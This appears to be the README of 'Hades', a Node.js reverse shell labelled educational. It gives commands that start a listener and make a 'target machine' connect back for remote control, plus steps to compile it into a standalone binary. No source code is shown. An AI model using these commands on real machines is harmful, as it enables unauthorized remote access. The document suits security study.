# Hades
Simple reverse shell developed for education purposes.

This program is written in Typescript and is made to run with [Node.js](https://nodejs.org/). Some libraries are required, [see](#libs) the list of libraries used in this project.

![image info](demo.png)

## How to use
Disclaimer
- This reverse shell is for academic purposes, the use of this software is your responsibility.
- This software is still in development, not all the features are implemented yet.

Use with Node.js
1) Run `npm install`
2) Run `node src/main.js -a [port to listen on]` on the main machine.
3) Run `node src/main.js -c [admin's port] [admin's ip]` on a target machine.
4) Done !

Use a compiled version 
1) Garb a compiled version of the program.
2) Run `hades -a [port to listen on]` on the main machine.
3) Run `hades -c [admin's port] [admin's ip]` on a target machine.
4) Done !

## Compile using Nexe
To compile from source, you will need to follow the instructions listed below.

1) Run `npm install`
2) [Transpile](https://code.visualstudio.com/docs/typescript/typescript-compiling) all `.ts` files into `.js`.
3) Install [Nexe](https://github.com/nexe/nexe).
4) Execute `nexe src/main.js -o bin/hades -t "linux-x64-14.15.3" -r "src/**.js"`.
5) Change `linux-x64` with the os you are using following by the [architecture](https://linuxconfig.org/what-is-my-architecture-is-my-cpu-64-bit-or-32-bit#:~:text=The%20best%20way%20to%20quickly,default%20on%20all%20Linux%20distros.) of your CPU.

Note that the program is already compiled in the `bin` directory.

## Libs
Here is the list of used libraries, you can download all of them using `npm install`.
- `Axios` - Used to send requests.
- `Body-parser` - Used to parse responses.
- `WSS` - Used for socket connections.
- `Express` - Used to setup servers.